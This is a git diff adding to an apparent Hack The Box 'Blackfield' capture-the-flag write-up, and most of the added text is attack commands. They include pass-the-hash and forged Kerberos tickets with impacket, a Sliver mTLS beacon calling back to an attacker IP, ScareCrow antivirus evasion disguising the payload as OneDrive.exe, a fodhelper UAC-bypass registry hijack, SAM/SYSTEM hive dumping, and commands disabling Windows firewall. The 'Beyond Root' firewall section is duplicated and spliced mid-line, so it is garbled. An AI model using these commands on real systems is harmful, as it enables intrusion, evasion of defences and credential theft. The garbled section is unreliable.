@@ -104,16 +104,165 @@ Found the SPN
 Uncrackable as per rockyou.txt
 ![](svcbackhashnotinrockyoudottext.png)
 
-Impacket
+Impacket - being an idiot
 ```bash
 impacket-getTGT -dc-ip 10.129.19.77 -hashes 9658d1d1dcd9250115e2205d9f48400d:9658d1d1dcd9250115e2205d9f48400d BLACKFIELD.local/svc_backup
 ```
 The issues with clock skewage. 
 
-[After some time I remembered I already found all of the requirements to fix this for both VMware and Vbox](https://github.com/7RU7H/Archive/blob/main/Virtualization/Disable-Time-Synchronisation-With-Host-For-Guest-VMs.md). No GitHub facepalm emoji.
+[After some time I remembered I already found all of the requirements to fix this for both VMware and Vbox](https://github.com/7RU7H/Archive/blob/main/Virtualization/Disable-Time-Synchronisation-With-Host-For-Guest-VMs.md). No GitHub facepalm emoji. Now it is just configuring the time.
 
 
+![](netremotetoddoesnotwork.png)
 
+![](ntpdate-issuespersist.png)
+
+- wireshark kerberos 
+
+Recon services to find the time of a remote server  
+```bash
+sudo nmap -Pn -sC -sV -p- --min-rate 500 10.129.19.77 -oN sc-sv-timegrabbing
+sudo nmap -Pn -sU -p 123 --script ntp-info 10.129.19.77
+
+# password required unless -U "" -N Zero Auth allowed, does mean guest account has privilege to query time  
+rpcclient -U $username $ip netremotetod
+```
+
+![](thxSMBforthetime.png)
+
+[faketime](https://manpages.ubuntu.com/manpages/trusty/man1/faketime.1.html)
+```bash
+faketime
+
+# Usage: faketime [switches] <timestamp> <program with arguments>
+
+# This will run the specified 'program' with the given 'arguments'. The program will be tricked into seeing the given 'timestamp' as its starting date and time. The clock will continue to run from this timestamp. Please see the manpage (man faketime) for advanced options, such as stopping the wall clock and make it run faster or slower.
+
+The optional switches are:
+  -m                  : Use the multi-threaded version of libfaketime
+  -f                  : Use the advanced timestamp specification format (see manpage)
+  --exclude-monotonic : Prevent monotonic clock from drifting (not the raw monotonic one)
+  -p PID              : Pretend that the program\'s process ID is PID
+  --date-prog PROG    : Use specified GNU-compatible implementation of 'date' program
+
+# Advanced Timestamp format
+
+# Freeze clock at absolute timestamp: "YYYY-MM-DD hh:mm:ss"
+# Relative time offset: "[+/-]123[m/h/d/y]", e.g., "+60m", "+2y"
+# Start-at timestamps: "@YYYY-MM-DD hh:mm:ss"
+
+Examples:
+faketime 'last friday 5 pm' /bin/date
+faketime '2008-12-24 08:15:42' /bin/date
+faketime -f '+2,5y x10,0' /bin/bash -c 'date; while true; do echo $SECONDS ; sleep 1 ; done'
+faketime -f '+2,5y x0,50' /bin/bash -c 'date; while true; do echo $SECONDS ; sleep 1 ; done'
+faketime -f '+2,5y i2,0' /bin/bash -c 'date; while true; do date; sleep 1 ; done' # In this single case all spawned processes will use the same global clock without restarting it at the start of each process.
+
+# (Please note that it depends on your locale settings whether . or , has to be used for fractions)
+```
+
+[faketime to set the time - HTB anubis spoilers be warned from 0xdf](https://0xdf.gitlab.io/2022/01/29/htb-anubis.html)
+
+![](faketimeworkedallaroundNASAlevelcelebrations.png)
+
+![](getuserspnsvcbackup.png)
+
+Played around with `impacket` till I find my footholding
+```bash
+faketime -f '+8h' impacket-lookupsid -nthash 9658d1d1dcd9250115e2205d9f48400d:9658d1d1dcd9250115e2205d9f48400d -domain-sid -target-ip 10.129.19.77 BLACKFIELD.local/svc_backup@DC01.BLACKFIELD.local | tee -a svc_backup_lookupsid.impacket
+```
+
+![](niceticketer.png)
+
+```bash
+faketime -f '+8h' impacket-ticketer -nthash 9658d1d1dcd9250115e2205d9f48400d -domain-sid S-1-5-21-4194615774-2175524697-3563712290 -domain BLACKFIELD.local svc_backup
+```
+
+Nevermind, I confused PSRemoting and PSExec.
+![](confusionpsremotingwithpsexec.png)
+
+I have done SeBackupPrivilege Before so I really wanted to try a UAC bypass as we have High Mandatory Level, but in Winrm
+![](whoamisvcbackup.png)
+
+![](pathofleastrestistecewithdc01.png)
+
+![](nodcsyncaged.png)
+
+![](snovvcrashtrickshotingtheandrw.png)
+
+[UAC bypass trick from PPN - snovvcrash](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/uac-bypass)
+```
+Cmd > net use A: \\127.0.0.1\C$
+Cmd > A:
+Cmd > cd \Windows\System32
+Cmd > echo test > test.txt
+Cmd > dir test.txt
+```
+
+```bash
+generate beacon --mtls  10.10.14.160:135 --arch amd64 --os windows --save /tmp/135-sliver.bin -f shellcode -G
+
+
+mtls -L  10.10.14.160 -l 135
+
+/opt/ScareCrow/ScareCrow -I /tmp/135-sliver.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
+# Build with golang
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
+# Pack with upx
+upx $file.exe
+
+*Evil-WinRM* PS C:\programdata> upload OneDrive.exe
+```
+
+
+```powershell
+$program = "powershell -windowstyle hidden C:\programdata\OneDrive.exe"
+  
+New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
+Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
+
+
+New-Item -Path "HKCU:\Software\Classes\ms-settings\FunDrive" -Force
+Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\FunDrive" -Name "(default)" -value ".pwn" -Force
+    
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+```
+
+![](sillypopcorns.png)
+
+Performing intended path then
+![](dotheintendedpath.png)
+
+```go
+execute -o cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
+```
+
+And we have the SAM and SYSTEM hives
+![](samandsystemforblackfield.png)
+
+If this would work for shell it would be nice, but does not.
+```
+67ef902eae0d740df6257f273de75051:67ef902eae0d740df6257f273de75051
+```
+![](adminhashinthesecretdump.png)
+
+```bash
+faketime -f '+8h' impacket-ticketer -nthash 67ef902eae0d740df6257f273de75051 -domain-sid S-1-5-21-4194615774-2175524697-3563712290 -domain BLACKFIELD.local Administrator
+```
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+
+# Psexc in!
+faketime -f '+8h' impacket-psexec -k -no-pass DC01.BLACKFIELD.local -dc-ip 10.129.19.77
+```
+
+Some whining later I resorted to `robocopy` 
+![](grabbedthenotes.png)
+
+![](recoverynothingfromthisdir.png)
+
+![](verysadwmiexec.png)
 
 
 
@@ -121,8 +270,124 @@ The issues with clock skewage.
 
 - Yes the obvious answer is good, but sometimes the answer you did not know `vol` does not work have fun is the unfortunate state of the machine and the truth.
 - I need a Forensics box with volatility working.
+- I did it all by myself!
+- I troubleshooted issues myself
 
 ## Beyond Root
 
 
 - https://www.thehacker.recipes/a-d/movement/credentials/dumping/passwords-in-memory
+
+#### Firewall fun with netsh for legacy Windows and Powershell for modern Windows
+
+Firewall fun has been sitting in my to do list for beyond root.
+
+####  Netsh for Windows 7, Server 2008 (R2), Vista
+
+[Netsh command is deprecated for - Windows 7, Server 2008 (R2), Vista](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc771920(v=ws.10))
+```powershell
+# Check Profile
+netsh advfirewall show currentprofile
+
+# Turn off the Firewall
+NetSh Advfirewall set allprofiles state off
+
+# Modify a Firewall Rule for a program
+netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=in enable=yes action=allow profile=Private
+netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=out enable=yes action=allow profile=Private
+# Delete a rule
+netsh.exe advfirewall firewall delete rule "<Rule Name>"
+```
+[test](https://www.itninja.com/blog/view/how-to-add-firewall-rules-using-netsh-exe-advanced-way)
+
+![](fwbr1.png)
+
+![](uacrequriedforfwbr2.png)
+#### Powershell Window 10 and Server 2016 onwards
+
+```powershell
+powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block 
+```
+
+```powershell
+powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property 
+DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}}, @{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}}, @{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile, Direction, Action"
+```
+
+```powershell
+powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalP#### Firewall fun with netsh for legacy Windows and Powershell for modern Windows
+
+```
+
+####  Netsh for Windows 7, Server 2008 (R2), Vista
+
+[Netsh command is deprecated for - Windows 7, Server 2008 (R2), Vista](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc771920(v=ws.10))
+
+```powershell
+# Check Profile
+netsh advfirewall show currentprofile
+
+# Turn off the Firewall
+NetSh Advfirewall set allprofiles state off
+
+# Modify a Firewall Rule for a program
+netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=in enable=yes action=allow profile=Private
+netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=out enable=yes action=allow profile=Private
+# Delete a rule
+netsh.exe advfirewall firewall delete rule "<Rule Name>"
+```
+[test](https://www.itninja.com/blog/view/how-to-add-firewall-rules-using-netsh-exe-advanced-way)
+
+#### Powershell Window 10 and Server 2016 onwards
+
+```powershell
+powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block 
+```
+
+```powershell
+powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property 
+DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}}, @{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}}, @{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile, Direction, Action"
+```
+
+```powershell
+powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action"
+
+```
+
+```powershell
+powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
+```
+
+Enable Window Defender Firewall
+```powershell
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
+```
+Disable Window Defender Firewall
+```powershell
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+```
+
+
+```powershell
+Set-NetFirewallProfile -DefaultInboundAction Block -DefaultOutboundAction Allow –NotifyOnListen True -AllowUnicastResponseToMulticast True –LogFileName %SystemRoot%\System32\LogFiles\Firewall\pfirewall.log
+````ort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action"
+
+```
+
+```powershell
+powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
+```
+
+Enable Window Defender Firewall
+```powershell
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
+```
+Disable Window Defender Firewall
+```powershell
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+```
+
+
+```powershell
+Set-NetFirewallProfile -DefaultInboundAction Block -DefaultOutboundAction Allow –NotifyOnListen True -AllowUnicastResponseToMulticast True –LogFileName %SystemRoot%\System32\LogFiles\Firewall\pfirewall.log
+```
